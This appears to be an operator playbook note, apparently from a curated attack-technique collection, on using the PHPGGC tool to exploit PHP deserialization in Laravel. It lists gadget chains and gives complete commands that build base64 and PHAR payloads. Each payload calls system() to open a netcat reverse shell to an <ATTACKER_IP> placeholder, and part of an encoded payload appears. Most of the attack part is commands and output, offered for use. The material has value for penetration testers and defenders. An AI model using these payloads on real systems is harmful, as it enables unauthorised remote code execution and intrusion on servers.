---
technique: "Tools of the Trade (PHP Deserialization)"
family: "deserialization"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/Deserialization Attacks/Tools of the Trade (PHP Deserialization).md"
source_sha256: "4209e98de4f2db21a27091e1cc5d94e99dd1c84b511dcdff1ee124c01ec084f9"
curator_version: 2
review_status: imported-unreviewed
---

# Tools of the Trade (PHP Deserialization)

> Family: **deserialization** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: phpggc.

## Quick index — payloads & commands in this note
- `php: git clone https://github.com/ambionics/phpggc.git`
- `bash: phpggc Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -b`
- `php: phpggc -p phar Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -o exploit.pha`

## Playbook (operator notes)

# Tools of the Trade (PHP Deserialization)

## **PHPGGC**

[https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)

Contains a collection of `gadget chains` (a chain of functions) built from vendor code in a collection of PHP frameworks, which allow us to achieve various actions, including file reads, writes, and RCE

```php
git clone https://github.com/ambionics/phpggc.git

phpggc -l Laravel

Gadget Chains
-------------

NAME             VERSION            TYPE                   VECTOR        I    
Laravel/RCE1     5.4.27             RCE (Function call)    __destruct         
Laravel/RCE10    5.6.0 <= 9.1.8+    RCE (Function call)    __toString         
Laravel/RCE2     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE3     5.5.0 <= 5.8.35    RCE (Function call)    __destruct    *    
Laravel/RCE4     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE5     5.8.30             RCE (PHP code)         __destruct    *    
Laravel/RCE6     5.5.* <= 5.8.35    RCE (PHP code)         __destruct    *    
Laravel/RCE7     ? <= 8.16.1        RCE (Function call)    __destruct    *    
Laravel/RCE8     7.0.0 <= 8.6.9+    RCE (Function call)    __destruct    *    
Laravel/RCE9     5.4.0 <= 9.1.8+    RCE (Function call)    __destruct         

```

We can see that the `Type` of this gadget chain is `RCE (Function call)`. This means we need to specify a PHP function (and its arguments) that the gadget chain should call for us.

To get a reverse shell, we want to call the PHP function `system()` with the argument `'nc -nv <ATTACKER_IP> 9999 -e /bin/bash'`, and so we get the following command (with the `-b` flag to get Base64 encoded output):

```bash
phpggc Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -b 
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2...SNIP...Jhc2giO319
```

> Note: This payload generated from `PHPGGC` works, but results in a `500: Server Error` whereas our custom payload did not. This is because `PHPGGC` does not generate a valid `UserSettings` object. If our only goal is to get RCE, this doesn't matter, however.
> 

### **PHAR(GGC)**

A fork of PHPGGC which, instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and, as such, can be used for various exploitation techniques (file_exists, fopen, etc.)." The fork has since been merged into PHPGGC.

```php
phpggc -p phar Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -o exploit.phar
```

## Source
Original note: `_raw/Web attacks/Web Attacks/Deserialization Attacks/Tools of the Trade (PHP Deserialization).md`
